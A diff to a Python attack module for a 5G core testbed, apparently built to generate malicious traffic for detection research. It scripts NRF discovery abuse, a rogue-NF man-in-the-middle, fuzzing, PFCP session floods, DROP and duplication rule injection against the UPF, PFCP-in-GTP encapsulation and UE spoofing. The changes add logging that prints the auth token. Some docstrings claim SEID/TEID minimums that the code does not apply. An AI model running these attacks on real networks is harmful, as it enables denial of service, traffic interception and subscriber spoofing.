@@ -22,22 +22,21 @@ class Attacks():
             Send N (random) discovery request targetting different nf_type.
             There is a ~2 (+/- 1) seconds delay between each discovery request.
         """
-        
-        # Add instance and get token
         instance:NFInstance|None = NFInstance.add_random_nf(display=False)
         token = instance.get_token("nnrf-disc", "NRF", display=False)
-
-        # Find a UDM instance
         number_to_discover = random.randint(1,len(NFInstance.nf_type_list))
         nfs_to_discover = random.sample(NFInstance.nf_type_list, number_to_discover)
         
-        # Send the discovery
+        print(f"Discovering {number_to_discover} NFs: {nfs_to_discover} with token {token}")
+        
         success = True
         for nf_type in nfs_to_discover : 
+            print(f"-- Requesting info for nf_type={nf_type} with token={token}")
             result = instance.get_nf_info(token, nf_type, display=False)
             success = success and result
             
             time_to_sleep = int(random.normalvariate(2, 1))
+            print(f"-- Sleeping for {time_to_sleep} seconds")
             time.sleep(time_to_sleep)
             
         return success
@@ -49,13 +48,20 @@ class Attacks():
             The rogue instance is effectively a man in the middle.
             Wait ~120 (+/- 10) seconds before removing the man in the middle.
         """
+        
         nf_type = NFInstance.get_random_nf_type()
+        print(f"Starting MITM for nf_type: {nf_type}")
+        
         start = CNMitm.start(nf_type)
+        print(f"-- MITM started: {start}")
         
         time_to_sleep = int(random.normalvariate(120, 10))
+        print(f"-- Sleeping for {time_to_sleep} seconds during MITM")
         time.sleep(time_to_sleep)
         
         stop = CNMitm.stop(nf_type)
+        print(f"-- MITM stopped: {stop}")
+        
         return start and stop
              
     def fuzz() -> bool:
@@ -65,15 +71,17 @@ class Attacks():
         """
         nf_list = ["NRF", "UDM", "AMF"]
         nf = random.choice(nf_list)
+        print(f"Fuzzing NF: {nf}")
         result = CNFuzzing().fuzz(nf, nb_file=1, nb_url=10, nb_ite=10, nb_method=1)
-        
         return len(result) == 10*10
         
-    # SESSION MANAGEMENT
+        # SESSION MANAGEMENT
         
     def flood_etablishment() -> bool:
         "Send ~100 (+/- 10) session establishment requests with random seid, teid and ue_address"
-        # Association setup request are necessary preliminary steps
+        
+        print("Sending initial association setup")
+        
         send(
             PFCPRequest.association_setup(
                 src_addr=get_my_ip_from_prefix(),
@@ -81,24 +89,25 @@ class Attacks():
             )
         )
         
-        time.sleep(5) # need a bit of time process the association
-        
-        # Send the 100 requests
+        time.sleep(5)
         nb = int(random.normalvariate(100, 10))
+        print(f"Number of session establishments to send: {nb}")
+
         for _ in range(nb):
+            seid = random.randint(0x1, PFCPRequest.max_seid)
+            teid = random.randint(0x1, PFCPRequest.max_teid)
+            ue_addr = PFCPRequest.random_ue_address()
             
-            # Etablishment request
+            print(f"Sending session establishment: seid={seid}, teid={teid}, ue_addr={ue_addr}")
             send(
                 PFCPRequest.session_establishment(
                     src_addr=get_my_ip_from_prefix(),
                     dst_addr=ip_list["UPF"],
-                    ue_addr=PFCPRequest.random_ue_address(),
-                    teid=random.randint(0x1, PFCPRequest.max_teid),
-                    seid=random.randint(0x1, PFCPRequest.max_seid)
+                    ue_addr=ue_addr,
+                    teid=teid,
+                    seid=seid
                 )
             )
-            
-        # didnt achieve to verify the output yet
         return True
         
     def flood_deletion() -> bool:
@@ -108,22 +117,20 @@ class Attacks():
             The minimum serves to avoid impacting legitimate sessions.
         """
         
-        # The first seid is random and then incremented
-        # Legitimate seid will have low value and we don't want to impact legitimate sessions 
-        # We also don't want to overflow on the maxvalue
         first_seid = random.randint(1000, PFCPRequest.max_seid-1000)
-        
         nb = int(random.normalvariate(100, 10))
+        print(f"Sending {nb} session deletion requests starting from seid={first_seid}")
+        
         for i in range(nb):
+            seid = first_seid + i
+            print(f"Sending session deletion: seid={seid}")
             send(
                 PFCPRequest.session_deletion(
                     src_addr=get_my_ip_from_prefix(),
                     dst_addr=ip_list["UPF"],
-                    seid=first_seid+i
+                    seid=seid
                 )
             )
-        
-        # didnt achieve to verify the output yet
         return True
         
     def modify_drop() -> bool:
@@ -131,19 +138,24 @@ class Attacks():
             Send 1 session modification request containing a DROP rule to a random UE, with random SEID and TEID.
             SEID and TEID have a minimum of 1000 to avoid impacting legitimate sessions.
         """
+        
+        seid    = random.randint(1000, PFCPRequest.max_seid)
+        teid    = random.randint(1000, PFCPRequest.max_teid)
+        ue_addr = PFCPRequest.random_ue_address()
+        far_id  = random.randint(1, 1000)
+        
+        print(f"Sending session modification with DROP: seid={seid}, teid={teid}, ue_addr={ue_addr}, far_id={far_id}")
         send(
             PFCPRequest.session_modification(
                 src_addr=get_my_ip_from_prefix(),
                 dst_addr=ip_list["UPF"],
-                ue_addr=PFCPRequest.random_ue_address(),
-                seid=random.randint(1000, PFCPRequest.max_seid), # we dont want to DoS legitimate sessions
-                teid=random.randint(1000, PFCPRequest.max_teid), # same with the legitimate tunnels
-                far_id=random.randint(1, 1000),
+                ue_addr=ue_addr,
+                seid=seid,
+                teid=teid,
+                far_id=far_id,
                 actions=["DROP"]
             )
         )
-        
-        # didnt achieve to verify the output yet
         return True
         
     def modify_dupl() -> bool:
@@ -152,21 +164,25 @@ class Attacks():
             SEID and TEID have a minimum of 1000 to avoid impacting legitimate sessions.
         """
         
+        seid    = random.randint(0, PFCPRequest.max_seid)
+        teid    = random.randint(0, PFCPRequest.max_teid)
+        ue_addr = PFCPRequest.random_ue_address()
+        far_id  = random.randint(1, 1000)
+        
+        print(f"Sending session modification with DUPL: seid={seid}, teid={teid}, ue_addr={ue_addr}, far_id={far_id}")
         send(
             PFCPRequest.session_modification(
                 src_addr=get_my_ip_from_prefix(),
                 dst_addr=ip_list["UPF"],
-                ue_addr=PFCPRequest.random_ue_address(),
-                seid=random.randint(0, PFCPRequest.max_seid), 
-                teid=random.randint(0, PFCPRequest.max_teid), 
-                far_id=random.randint(1, 1000),
-                actions=["FORW","DUPL"] # forward is still necessary
+                ue_addr=ue_addr,
+                seid=seid, 
+                teid=teid, 
+                far_id=far_id,
+                actions=["FORW","DUPL"]
             )
         )
-        
-        # didnt achieve to verify the output yet
         return True
-    
+        
     def seid_fuzzing() -> bool:
         """
             Send ~100 (+/- 10) session modification requests with FORWARD rule. 
@@ -175,49 +191,53 @@ class Attacks():
             The first seid is random (with a minimum of 1000) and then incremented.
             The teid is completely random.
         """
-        
         first_seid = random.randint(0, PFCPRequest.max_seid)
-
         nb = int(random.normalvariate(100, 10))
+        print(f"Sending {nb} session modification requests starting from seid={first_seid}")
+        
         for i in range(nb):
+            seid    = first_seid + i
+            teid    = random.randint(0, PFCPRequest.max_teid)
+            ue_addr = PFCPRequest.random_ue_address()
+            far_id  = random.randint(1, 1000)
+            
+            print(f"Sending session modification: seid={seid}, teid={teid}, ue_addr={ue_addr}, far_id={far_id}")
             send(
                 PFCPRequest.session_modification(
                     src_addr=get_my_ip_from_prefix(),
                     dst_addr=ip_list["UPF"],
-                    ue_addr=PFCPRequest.random_ue_address(),
-                    seid=first_seid+i, 
-                    teid=random.randint(0, PFCPRequest.max_teid), 
-                    far_id=random.randint(1, 1000),
-                    actions=["FORW"] # forward is still necessary
+                    ue_addr=ue_addr,
+                    seid=seid, 
+                    teid=teid, 
+                    far_id=far_id,
+                    actions=["FORW"]
                 )
             )
-            
-        # didnt achieve to verify the output yet
         return True
 
-    # PACKET FORWARDING 
+        # PACKET FORWARDING 
 
     def pfcp_in_gtp() -> bool:
         """ 
             Send 1 pfcp packet encapsulated in a gtp layer.
             The pfcp packet is benign but having this kind of encapsulation could be used for attacks and shouldn't happen.
         """
-        
         pfcp_packet = PFCPRequest.association_setup(
             src_addr=get_my_ip_from_prefix(),
             dst_addr=ip_list["UPF"]
         )
         
+        teid = random.randint(0, PFCPRequest.max_teid)
+        print(f"Sending PFCP in GTP: teid={teid}")
+        
         send(
             pfcp_in_gtp_packet(
                 src_addr=get_my_ip_from_prefix(),
                 dst_addr=ip_list["UPF"],
-                teid=random.randint(0, PFCPRequest.max_teid),
+                teid=teid,
                 pfcp_packet=pfcp_packet
             )
         )
-        
-        # didnt achieve to verify the output yet
         return True
 
     def uplink_spoofing() -> bool:
@@ -225,19 +245,26 @@ class Attacks():
             Send 1 packet from the CN spoofing an UE.
             The packet is supposed to be send to the DN where it will be seen as originating from the UE.
         """
+        tunnel_dst_addr = random.choice(dn_domains)
+        ue_addr = PFCPRequest.random_ue_address()
+        teid = random.randint(0, PFCPRequest.max_teid)
+        print(f"Sending uplink spoofing: tunnel_dst_addr={tunnel_dst_addr}, ue_addr={ue_addr}, teid={teid}")
         
         send(
             gtp_uplink_packet(
                 src_addr=get_my_ip_from_prefix(),
                 dst_addr=ip_list["UPF"],
-                tunnel_dst_addr=random.choice(dn_domains),
-                ue_addr=PFCPRequest.random_ue_address(),
-                teid=random.randint(0, PFCPRequest.max_teid)
+                tunnel_dst_addr=tunnel_dst_addr,
+                ue_addr=ue_addr,
+                teid=teid
             )
         )
-        
-        # didnt achieve to verify the output yet
         return True
 
     # def user_mitm():
     #     pass
+
+def random_attack() -> str:
+    available_attacks = [name for name in dir(Attacks) if callable(getattr(Attacks, name)) and not name.startswith("_")]
+    attack = random.choice(available_attacks)
+    return attack
